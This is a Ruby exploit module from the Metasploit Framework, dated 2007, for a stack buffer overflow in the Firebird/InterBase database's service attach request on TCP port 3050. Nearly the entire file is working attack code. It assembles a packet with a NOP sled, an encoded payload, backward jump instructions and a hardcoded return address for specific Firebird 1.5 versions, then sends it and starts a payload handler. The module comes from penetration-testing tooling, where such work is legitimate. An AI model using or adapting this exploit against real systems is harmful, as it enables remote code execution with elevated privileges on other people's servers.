##
# $Id: fb_svc_attach.rb 5136 2007-10-04 03:03:13Z ramon $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Misc::Fb_Svc_Attach < Msf::Exploit::Remote

	include Exploit::Remote::Tcp
	include Exploit::Remote::BruteTargets

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Firebird Relational Database SVC_attach() Buffer Overflow',
			'Description'	=> %q{
				This module exploits a stack overflow in Borland InterBase
				by sending a specially crafted service attach request.
			},
			'Version'	=> '$Revision: 5136 $',
			'Author'	=>
				[
					'Ramon de Carvalho Valle <ramon@risesecurity.org>',
					'Adriano Lima <adriano@risesecurity.org>',
				],
			'Arch'		=> ARCH_X86,
			'Platform'	=> 'win',
			'References'	=>
				[
					[ 'URL', 'http://risesecurity.org/advisory/RISE-2007003/' ],
				],
			'Privileged'	=> true,
			'License'	=> MSF_LICENSE,
			'Payload'	=>
				{
					'Space' => 256,
					'BadChars' => "\x00\x2f\x3a\x40\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'	=>
				[
					[ 'Brute Force', { } ],
					# 0x0040230b pop ebp; pop ebx; ret
					[
						'Firebird WI-V1.5.3.4870 WI-V1.5.4.4910',
						{ 'Length' => [ 308 ], 'Ret' => 0x0040230b }
					],
					# Debug
					[
						'Debug',
						{ 'Length' => [ 308 ], 'Ret' => 0xaabbccdd }
					],
				],
			'DefaultTarget'	=> 1
		))

		register_options(
			[
				Opt::RPORT(3050)
			],
			self.class
		)

	end

	def exploit_target(target)

		target['Length'].each do |length|

			connect

			# Attach database
			op_attach = 19

			# Create database
			op_create = 20

			# Service attach
			op_service_attach = 82

			remainder = length.remainder(4)
			padding = 0

			if remainder > 0
				padding = (4 - remainder)
			end

			buf = ''

			# Operation/packet type
			buf << [op_service_attach].pack('N')

			# Id
			buf << [0].pack('N')

			# Length
			buf << [length].pack('N')

			# Nop block
			buf << make_nops(length - payload.encoded.length - 13)

			# Payload
			buf << payload.encoded

			# Jump back into the nop block
			buf << "\xe9" + [-260].pack('V')

			# Jump back
			buf << "\xeb" + [-7].pack('c')

			# Random alpha data
			buf << rand_text_alpha(2)

			# Target
			buf << [target.ret].pack('V')

			# Padding
			buf << "\x00" * padding

			# Database parameter block

			# Length
			buf << [1024].pack('N')

			# Random alpha data
			buf << rand_text_alpha(1024)

			sock.put(buf)

			#sleep(4)

			handler

		end

	end

end

end

